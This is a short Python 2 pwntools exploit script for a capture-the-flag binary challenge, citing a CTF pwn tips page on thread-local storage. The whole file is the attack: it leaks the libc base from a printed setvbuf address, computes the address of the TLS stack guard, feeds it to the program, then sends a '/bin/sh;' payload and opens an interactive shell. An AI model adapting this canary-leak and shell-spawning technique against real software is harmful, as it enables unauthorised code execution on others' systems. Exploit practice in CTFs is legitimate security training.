# https://github.com/Naetw/CTF-pwn-tips#secret-of-a-mysterious-section---tls

from pwn import *

libc = ELF('./libc.so.6')

r = process('./simple')

r.recvuntil('setvbuf @ ')
libc_base = int(r.recvline().strip(), 16) - libc.symbols['setvbuf']
print "libc_base @ ", hex(libc_base)

canary = libc_base + 0x5f6528
print "stack_guard @ ", hex(canary)

r.sendlineafter('address:', hex(canary))
#gdb.attach(r)

paylaod = 'a'*0x10+'/bin/sh;'+p64(0)*2
r.sendlineafter('buf:', paylaod)

r.interactive()